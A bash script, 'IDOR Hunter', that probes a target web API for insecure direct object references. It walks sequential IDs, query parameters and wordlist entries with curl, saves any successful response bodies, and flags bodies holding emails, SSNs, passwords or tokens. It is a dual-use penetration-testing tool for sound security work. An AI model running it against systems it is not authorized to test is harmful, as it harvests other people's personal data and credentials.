#!/bin/bash

# IDOR Hunter - Automated Insecure Direct Object Reference Scanner
# Usage: ./idor_hunter.sh <base_url> <resource_type> [wordlist] [limit]
# Example: ./idor_hunter.sh "https://target.com/api/user/" "user" /usr/share/wordlists/dirb/common.txt 20

set -euo pipefail

BASE_URL="${1:?Missing base_url parameter}"
RESOURCE="${2:?Missing resource_type parameter (user,order,invoice,etc)}"
WORDLIST="${3:-/usr/share/wordlists/dirb/common.txt}"
LIMIT="${4:-20}"

# Validate LIMIT is a number
if ! [[ "$LIMIT" =~ ^[0-9]+$ ]]; then
    echo "Error: LIMIT must be a positive integer" >&2
    exit 1
fi

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Test IDs to check (sequential + common jumps)
TEST_IDS=(1 2 3 4 5 6 7 8 9 10 20 50 100 500 1000 9999)
ID_JUMP_TEST=(1 2 5 10 20 50 100 200 500 1000)

# Unauthorized and Not Found patterns
unauthorized_patterns=("unauthorized" "forbidden" "permission denied" "access denied")
notfound_patterns=("not found" "404" "does not exist")

echo -e "${BLUE}IDOR Hunter Starting...${NC}"
echo -e "${YELLOW}Target: ${BASE_URL}${RESOURCE}/${NC}"
echo -e "${YELLOW}Wordlist limit: ${LIMIT}${NC}\n"

# Function to make request and check response
check_idor() {
    local id="$1"
    local base_endpoint="$2"
    
    # Handle both path and query parameter formats properly
    if [[ "$base_endpoint" == *"?id="* || "$base_endpoint" == *"?user_id="* || "$base_endpoint" == *"?order_id="* || "$base_endpoint" == *"?invoice_id="* ]]; then
        local endpoint="${base_endpoint}${id}"
    else
        local endpoint="${base_endpoint}${id}"
    fi
    
    echo -e "${BLUE}Testing ID: ${id} -> ${endpoint}${NC}"
    
    # Make request (use curl with timing to detect differences)
    response=$(curl -s -w "\n%{http_code}:%{time_total}" \
        -H "User-Agent: Mozilla/5.0 (IDOR-Hunter)" \
        -H "Accept: application/json, text/plain, */*" \
        --max-time 10 \
        "$endpoint" 2>/dev/null || echo "000:0")
    
    http_code=$(echo "$response" | tail -n1 | cut -d':' -f1)
    response_time=$(echo "$response" | tail -n1 | cut -d':' -f2 | cut -d'.' -f1)  # Remove microseconds
    body=$(echo "$response" | sed '$d')
    
    # Check for successful responses or data leaks (expanded success codes)
    if [[ "$http_code" == "200" || "$http_code" == "201" || "$http_code" == "202" || "$http_code" == "204" || "$http_code" == "302" ]]; then
        echo -e "${GREEN}[POTENTIAL IDOR] ${id} -> HTTP ${http_code} (${response_time}s)${NC}"
        
        # Check if response contains sensitive data patterns
        if echo "$body" | grep -qiE "(email|phone|address|ssn|credit|password|secret|token|key|api_key|auth|bearer)"; then
            echo -e "${RED}[HIGH CONFIDENCE IDOR] Sensitive data leak in ID ${id}!${NC}"
        fi
        
        # Save response for manual review (fixed: create new file each time)
        mkdir -p idor_responses
        local timestamp=$(date +%s)
        local filename="idor_responses/id_${id}_${timestamp}.txt"
        {
            echo "=== ID ${id} ==="
            echo "URL: $endpoint"
            echo "HTTP Code: $http_code"
            echo "Response Time: ${response_time}s"
            echo "Timestamp: $(date)"
            echo "=== RESPONSE BODY ==="
            echo "$body"
            echo "====================="
        } > "$filename"
        echo -e "${YELLOW}Response saved: $filename${NC}"
        
        return 0
    fi
    
    # Check for inconsistent error responses (IDOR indicator)
    local is_unauth=false
    for pattern in "${unauthorized_patterns[@]}"; do
        if echo "$body" | grep -qi "$pattern"; then
            is_unauth=true
            break
        fi
    done
    
    local is_notfound=false
    for pattern in "${notfound_patterns[@]}"; do
        if echo "$body" | grep -qi "$pattern" || [[ "$http_code" == "404" ]]; then
            is_notfound=true
            break
        fi
    done
    
    # If we get unauthorized instead of not found, might be IDOR protected
    if [[ "$is_unauth" == true && "$is_notfound" == false ]]; then
        echo -e "${YELLOW}[PROTECTED?] ID ${id} -> Unauthorized access (check manually)${NC}"
    fi
    
    return 1
}

# Test sequential IDs
echo -e "\n${BLUE}=== Phase 1: Sequential ID Testing ===${NC}"
for id in "${TEST_IDS[@]}"; do
    check_idor "$id" "${BASE_URL}${RESOURCE}/"
done

# Test ID jumps (common in paginated systems)
echo -e "\n${BLUE}=== Phase 2: ID Jump Testing ===${NC}"
for jump in "${ID_JUMP_TEST[@]}"; do
    check_idor "$jump" "${BASE_URL}${RESOURCE}/"
done

# Parameter fuzzing - common IDOR vectors
echo -e "\n${BLUE}=== Phase 3: Parameter Fuzzing ===${NC}"
PARAM_VECTORS=(
    "${BASE_URL}?id="
    "${BASE_URL}?user_id="
    "${BASE_URL}?order_id="
    "${BASE_URL}?invoice_id="
    "${BASE_URL}/profile?id="
    "${BASE_URL}/view?id="
    "${BASE_URL}/edit?id="
)

for param_url in "${PARAM_VECTORS[@]}"; do
    echo -e "\n${YELLOW}Testing parameter base: ${param_url}${NC}"
    check_idor "1" "$param_url"
done

# Directory/ID fuzzing if wordlist provided and exists
if [[ -f "$WORDLIST" ]]; then
    echo -e "\n${BLUE}=== Phase 4: Directory/ID Fuzzing (top ${LIMIT}) ===${NC}"
    count=0
    while IFS= read -r fuzz_id || [[ -n "$fuzz_id" ]]; do
        # Skip comments and empty lines
        [[ -z "$fuzz_id" || "$fuzz_id" =~ ^# ]] && continue
        
        # Limit to specified number
        ((count++))
        if [[ $count -gt $LIMIT ]]; then
            break
        fi
        
        echo -e "\n${YELLOW}[${count}/${LIMIT}] Fuzzing: ${fuzz_id}${NC}"
        # Test as both path and parameter
        check_idor "$fuzz_id" "${BASE_URL}${RESOURCE}/"
        check_idor "$fuzz_id" "${BASE_URL}?id="
    done < "$WORDLIST"
else
    echo -e "${YELLOW}Wordlist not found, skipping Phase 4${NC}"
fi

echo -e "\n${GREEN}=== IDOR Scan Complete ===${NC}"
echo -e "${YELLOW}Check 'idor_responses/' directory for saved responses${NC}"
echo -e "${BLUE}Manual verification recommended for all hits${NC}"
echo -e "${GREEN}Total potential IDORs found: $(find idor_responses -name "*.txt" | wc -l)${NC}"
